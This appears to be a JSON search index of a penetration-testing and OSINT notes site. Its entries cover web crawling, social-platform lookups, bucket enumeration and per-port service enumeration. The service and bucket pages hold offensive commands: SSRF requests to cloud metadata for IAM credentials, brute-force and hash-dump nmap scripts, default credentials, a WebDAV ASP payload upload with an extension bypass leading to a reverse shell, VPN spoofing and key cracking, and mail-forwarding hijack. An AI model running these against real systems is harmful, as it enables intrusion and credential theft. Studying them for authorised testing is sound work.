	"content": " General Informations # Photon is a fast OSINT web crawler which can retrieve the following data for a target : # URLs (in-scope \u0026amp; out-of-scope) # URLs with parameters (example.com/gallery.php?id=2) # Intel (emails, social media accounts, amazon buckets etc.) # Files (pdf, png, xml etc.) # Secret keys (auth/API keys \u0026amp; hashes) # JavaScript files \u0026amp; Endpoints present in them # Strings matching custom regex pattern # Subdomains \u0026amp; DNS related data # You can use the --ninja 4 option to get 4 clients requesting server. It can give a speed boost. # Under heavily development, the --update option is designed to check updates. \nCommands # Crawl a single website python photon.py -u \u0026#34;http://example.com\u0026#34; # Clone the website locally python photon.py -u \u0026#34;http://example.com\u0026#34; --clone # Output + verbose python photon.py -u \u0026#34;http://example.com\u0026#34; -o \u0026#34;mydir\u0026#34; -v python photon.py -u \u0026#34;http://example.com\u0026#34; --export=json # fetch archived URLs from archive.org (only last year results) python photon.py -u \u0026#34;http://example.com\u0026#34; --wayback # No data extraction python photon.py -u \u0026#34;http://example.com\u0026#34; --only-urls # Using other websites for requests (developer.facebook.com, codebeautify.org, photopea.com, pxlr.com) python photon.py -u \u0026#34;http://example.com\u0026#34; --ninja 4 # Dumping dns data for subdomains python photon.py -u http://example.com --dns"
},
{
	"uri": "/open-source-intelligence-osint/platforms-hunting/tumblr/",
	"title": "Tumblr",
	"tags": [],
	"description": "",
	"content": " Basics https://www.secjuice.com/tumblr-osint/ # Tumblr is an old platform (2007) and may contain old target accounts not deleted # For example, old blogs# Username will appear on the URL # As well as on multiple points userxxx.tumblr.com# User\u0026#39;s likes # The section can be disabled by the user # To find out userxx.tumblr.com/likes # Same for followers / following userxx.tumblr.com/followers userxx.tumblr.com/following userxx.tumblr.com/Followers userxx.tumblr.com/FOLLOWERS# Archives # User\u0026#39;s posts, media, reblog, text... userxx.tumblr.com/archive# Interesting elements on posts : # - Text # - Pictures # - Tags # - User interactions"
},
{
	"uri": "/network/services-enumeration/389_636_3269_ldap/",
	"title": "389/636/3269 - LDAP",
	"tags": [],
	"description": "",
	"content": " General Informations # Ports 389 - LDAP 636 - LDAPS (SSL) 3269 - LDAP Global Catalog # Architecture (LDAP is hierarchical) - DC = Domain Component, the domain name - OU = Organizational Unit, \\\u0026#34;folders - CN = Common Name, the name fiven to the objects (Username, Group name, Computer name, etc.) # Research syntax ldapsearch \u0026lt;bind options\u0026gt; -b \u0026lt;base to search from\u0026gt; \u0026lt;search filter\u0026gt; \u0026lt;attributes\u0026gt; # Interesting attributes for user class ldapsearch “(objectClass=user)” interesting attributes: - sAMAccountName - userPrincipalName - memberOf (groups) - badPwdCount (failed logins) - lastLogoff (timestamp) - lastLogon (timestamp) - pwdLastSet (timestamp) - logonCount # Interesting attributes for group class ldapsearch “(objectClass=group)” interesting attributes: - cn - member (one per user/group) - memberOf (if nested in another group) # Interesting attributes for computer class ldapsearch “(objectClass=computer)” interesting attributes: - name (NetBIOS name) - DNSHostName (FQDN) =\u0026gt; combine it with DNS lookups and you can enumerate every IP address in the domain without scanning - operatingSystem - operatingSystemVersion (patch level) - lastLogonTimestamp - servicePrincipalName (running services =\u0026gt; TERMSRV, HTTP, MSSQL) \nFacing Active Directory # Research ldapsearch -LLL -x -H ldap://pdc01.lab.ropnop.com -b ‘’ -s base ‘(objectclass=*)’ # Windapsearch is a good tool to automate the job (https://github.com/ropnop/windapsearch)"
},
{
	"uri": "/open-source-intelligence-osint/platforms-hunting/amazon_digitalocean/",
	"title": "Amazon &amp; Digital Ocean Buckets",
	"tags": [],
	"description": "",
	"content": " Look for static content in HTML, you can find content hosted on s3 bucket for example and then exploit it  \nAWS Bucket access (SSRF for example) # You can get informations and secret about an S3 bucket # Credentials, main goal http://169.254.169.254/latest/meta-data/iam/security-credentials/ http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2toS3/ # You might need the zone http://169.254.169.254/latest/dynamic/instance-identity/document # Then set # AWS_ACCESS_KEY_ID # AWS_SECRET_ACCESS_KEY # AWS_DEFAULT_REGION # AWS_SESSION_TOKEN \nAmazon S3 (AWS) Buckets # Tools like AWSBucketDump can enumerate AWS S3 buckets https://github.com/jordanpotti/AWSBucketDump \nTeh S3 Bucketeers https://github.com/tomdev/teh_s3_bucketeers/ # You need an AWS account and set your API key in ~/.aws/credentials [default] aws_access_key_id = \u0026lt;key\u0026gt; aws_secret_access_key = \u0026lt;secret\u0026gt; # Then just run it ./bucketeer.sh \u0026lt;target\u0026gt; \u0026lt;target\u0026gt; \nSlurp (https://github.com/0xbharath/slurp) # Go tool to enumerates S3 buckets manually or via certstream slurp domain \u0026lt;-t|--target\u0026gt; google.com slurp keyword \u0026lt;-t|--target\u0026gt; linux,golang,python slurp certstream \nBucket Stream (https://github.com/eth0izzle/bucket-stream) # Find interesting Amazon S3 Buckets by watching certificate transparency logs. # This tool simply listens to various certificate transparency logs (via certstream) # and attempts to find public S3 buckets from permutations of the certificates domain name # Basic python3 bucket-stream.py # You can put credentials / API key in confi.yml file and the tool will try to authenticate and identify bucket owners \nSpace Finder \u0026ndash; Digital Ocean (https://github.com/appsecco/spaces-finder) # Spaces finder is a tool to quickly enumerate DigitalOcean Spaces to look for loot. # It\u0026#39;s similar to a subdomain bruteforcer but is made specifically for DigitalOcean Spaces # Use SecLists as wordlists # If targetting specific company, uses enumall tool to get wordlist python3 spaces_finder.py -l SpacesNames.txt -g interesting_keywords.txt -D -m 500000 -d 1 -t 5"
},
{
	"uri": "/pwn/",
	"title": "Pwn",
	"tags": [],
	"description": "",
	"content": "Check menu on the left for content . .;;............ .. .;;;;::::::::::::.. ':;;:::::::::::: . . ':  "
},
{
	"uri": "/network/services-enumeration/995_pop3s/",
	"title": "995 - POP3S",
	"tags": [],
	"description": "",
	"content": " Identification and Scans # Retrieve POP3 server capabilities (CAPA, TOP, USER, SASL, RESP-CODES, LOGIN-DELAY, PIPELINING, EXPIRE, UIDL, IMPLEMENTATION) nmap -v -sV --version-intensity=5 --script pop3-capabilities -p T:995 IP # Try to bruteforce POP3 accounts nmap --script pop3-brute --script-args pop3loginmethod=SASL-LOGIN -p T:995 IP nmap --script pop3-brute --script-args pop3loginmethod=SASL-CRAM-MD5 -p T:995 IP nmap --script pop3-brute --script-args pop3loginmethod=APOP -p T:995 IP \nSSL Checking # Using openssl openssl s_client -connect IP:995 \nAuthentication Checking (classical credentials) USER admin PASS admin USER root PASS root USER root PASS toor"
},
{
	"uri": "/resources/",
	"title": "External Resources",
	"tags": [],
	"description": "",
	"content": "Check menu on the left for content . .;;............ .. .;;;;::::::::::::.. ':;;:::::::::::: . . ':  "
},
{
	"uri": "/open-source-intelligence-osint/platforms-hunting/parler/",
	"title": "Parler",
	"tags": [],
	"description": "",
	"content": " Resources https://www.skopenow.com/news/the-new-digital-meeting-place-what-parler-means-for-osint-investigators \nTips \u0026amp; Tricks # You can use dorks without account to find content site:parler.com site:parler.com/post/ site:parler.com/profile/ site:parler.com/profile/{username}"
},
{
	"uri": "/network/services-enumeration/1025_nfs_iis/",
	"title": "1025 - NFS/IIS",
	"tags": [],
	"description": "",
	"content": " Identification and Checking # Check on the Web port (80 ?): # _vti_pvt for OSCP /_vti_pvt/access.cnf /_vti_pvt/service.cnf /_vti_inf.htm \nWebDAV Exploitation using Metasploit # Checking WebDAV using metasploit use auxiliary/scanner/http/webdav_scanner set rhosts \u0026lt;IP\u0026gt; run # Content discovery using metasploit use auxiliary/scanner/http/webdav_website_content set rhosts \u0026lt;IP\u0026gt; run # Checking authentication using metasploit use auxiliary/scanner/http/ms09_020_webdav_unicode_bypass set rhosts \u0026lt;IP\u0026gt; run # Upload exploitation using metasploit use exploit/windows/iis/iis_webdav_upload_asp \nManual WebDAV exploitation (cadaver) cadaver http://IP/ # Goal is to upload file on IIS Server. ls # Find a directory where we can upload. cd \u0026lt;path\u0026gt; # Test for upload put /path/to/test.asp test.asp # Upload payload put /path/to/payload.asp longnamebrotesttest123456789.txt # Copy and rename payload copy longnamebrotesttest123456789.txt longnamebrotesttest123456789.asp;.txt # Access (should execute the ASP content) http://IP/_vti_pvt/longnamebrotesttest123456789.asp%3b.txt # Then go for reverse shell"
},
{
	"uri": "/network/services-enumeration/1433_mssql/",
	"title": "1433 - MSSQL",
	"tags": [],
	"description": "",
	"content": " Identification and Scans # Using nmap NSE scripts nmap -n -sV --version-intensity=5 -sT -Pn -p T:1433 --script=xxxx \u0026lt;IP\u0026gt; # Bruteforce accounts and password against a MSSQL Server ms-sql-brute # Queries Microsoft SQL Server (ms-sql) instances for a list of databases, linked servers,and configuration settings. # Credentials required ms-sql-config # Queries the Microsoft SQL Browser service for the DAC (Dedicated AdminConnection) ms-sql-dac # Dumps the password hashes from an MS-SQL server in a format suitable # Credentials required ms-sql-dump-hashes # Attempts to authenticate to Microsoft SQL Servers using an empty password forthe sysadmin (sa) account. ms-sql-empty-password # Queries Microsoft SQL Server (ms-sql) instances for a list of databases a user hasaccess to. # Credentials required ms-sql-hasdbaccess # Attempts to determine configuration and version information for Microsoft SQLServer instances ms-sql-info # Runs a query against Microsoft SQL Server (ms-sql). # Credentials required. ms-sql-query # Queries Microsoft SQL Server (ms-sql) for a list of tables per database. # Credentials required ms-sql-tables # Attempts to run a command using the command shell of Microsoft SQL Server (ms-sql) # Credentials required ms-sql-xp-cmdshell"
},
{
	"uri": "/network/services-enumeration/1721_500_vpn/",
	"title": "1721/500 - VPN",
	"tags": [],
	"description": "",
	"content": " Resources https://github.com/0x90/vpn-arsenal https://opensourceforu.com/2012/01/ipsec-vpn-penetration-testing-backtrack-tools/ http://devloop.users.sourceforge.net/index.php?article108/solution-du-ctf-hacklab-vulnvpn https://resources.infosecinstitute.com/vulnvpn/#gref https://0xrick.github.io/hack-the-box/conceal/#ike-scan-Setting-up-The-Connection \nExploitation Techniques # IKEv2 Authenthication IP spoofing ike-scan --sport=1723 --dport=1723 --sourceip=IP_To_Spoof --ikev2 \u0026lt;IP\u0026gt; # Trying all authentication modes ike-scan --dport=1723 --auth=1 \u0026lt;IP\u0026gt; ike-scan --dport=1723 --auth=3 \u0026lt;IP\u0026gt; ike-scan --dport=1723 --auth=64221 \u0026lt;IP\u0026gt; # IP spoofing using ike-scan ike-scan --dport=1723 --sourceip=IP_To_Spoof --auth=1 \u0026lt;IP\u0026gt; ike-scan --dport=1723 --sourceip=IP_To_Spoof --auth=3 \u0026lt;IP\u0026gt; ike-scan --dport=1723 --sourceip=IP_To_Spoof --auth=64221 \u0026lt;IP\u0026gt; # IP spoofing and agressive mode ike-scan --dport=1723 --sourceip=IP_To_Spoof -A --auth=1 \u0026lt;IP\u0026gt; ike-scan --dport=1723 --sourceip=IP_To_Spoof -A --auth=3 \u0026lt;IP\u0026gt; ike-scan --dport=1723 --sourceip=IP_To_Spoof -A --auth=64221 \u0026lt;IP\u0026gt; # Show fingerprint ike-scan --dport=1723 --sourceip=IP_To_Spoof -A --auth=1 --showbackoff \u0026lt;IP\u0026gt; ike-scan --dport=1723 --sourceip=IP_To_Spoof -A --auth=3 --showbackoff \u0026lt;IP\u0026gt; ike-scan --dport=1723 --sourceip=IP_To_Spoof -A --auth=64221 --showbackoff \u0026lt;IP\u0026gt; # Crack the key using psk-crack psk-crack hash-file.txt psk-crack -b 5 IP psk-crack -b 5 --charset=\u0026#34;01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\u0026#34; \u0026lt;IP\u0026gt; psk-crack -d wordlist.txt \u0026lt;IP\u0026gt;"
},
{
	"uri": "/network/services-enumeration/3306_mysql/",
	"title": "3306 - MySQL",
	"tags": [],
	"description": "",
	"content": " Basics # Try connection from outside mysql --host \u0026lt;IP\u0026gt; -u root -proot # Connection from the target machine mysql -u root -p root database \nClassical commands show databases; use database_name; show tables; describe table_name; select host, user, password from mysql.user; \nIdentification and Scan # Using nmap NSE scripts nmap -n -sV --version-intensity=5 -Pn -p T:3306 --script=xxxx \u0026lt;IP\u0026gt; # Audits MySQL database server security configuration mysql-audit # Bruteforce accounts and password against a MySQL Server mysql-brute # Attempts to list all databases on a MySQL server. (creds required) mysql-databases #Dumps the password hashes from an MySQL server in a format suitable (creds required) mysql-dump-hashes # Checks for MySQL servers with an empty password for root or anonymous. mysql-empty-password # Performs valid-user enumeration against MySQL server using a bug mysql-enum # Connects to a MySQL server and prints information such as the protocol and version numbers, thread ID, status, capabilities, and the password salt. mysql-info # Runs a query against a MySQL database and returns the results as a table. (creds required) mysql-query # Attempts to list all users on a MySQL server. mysql-users # Attempts to show all variables on a MySQL server. mysql-variables # Attempts to bypass authentication in MySQL and MariaDB servers by exploiting CVE2012-2122. If its vulnerable, it will also attempt to dump the MySQL usernames and password hashes. mysql-vuln-cve2012-2122"
},
{
	"uri": "/network/services-enumeration/3389_rdp/",
	"title": "3389 - RDP",
	"tags": [],
	"description": "",
	"content": " Identification and Scans # Using nmap NSE scripts nmap -Pn -sV --version-intensity=5 -p T:3389 --script=xxxx \u0026lt;IP\u0026gt; # Determines which Security layer and Encryption level is supported by the RDP service rdp-enum-encryption # Checks if a machine is vulnerable to MS12-020 RDP vulnerability rdp-vuln-ms12-020.nse  \nCredentials bruteforce # Using ncrack for one user ncrack -vv -u nina -P passwords.txt rdp://IP # Using ncrack for several users ncrack -vv -U users.txt -P passwords.txt rdp://IP \nConnexion # Using rdesktop rdesktop -u \u0026#34;username\u0026#34; -p \u0026#34;password\u0026#34; -g 80% -r disk:share=/path/to/share/with/remote/host \u0026lt;IP\u0026gt; # Remmina is cool too"
},
{
	"uri": "/network/services-enumeration/4555_rsip/",
	"title": "4555 - RSIP",
	"tags": [],
	"description": "",
	"content": " Forwarding admin\u0026rsquo;s mails # Connection through netcat (can test for creds) nc -nv \u0026lt;IP\u0026gt; 4555 # Get commands HELP # Get users (hopefully an admin?) listusers # Add user adduser haax haaxpass # Set an alias for our user setalias mailadmin haax # Set mail forwarding setforwarding mailadmin haax@lab.local"
},
{
	"uri": "/open-source-intelligence-osint/technical-recon/misc/",
	"title": "MISC",
	"tags": [],
	"description": "",
	"content": "Check menu on the left for content . .;;............ .. .;;;;::::::::::::.. ':;;:::::::::::: . . ':  "
},
{
	"uri": "/categories/",
	"title": "Categories",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "/tags/",
	"title": "Tags",
	"tags": [],
	"description": "",
	"content": ""
}]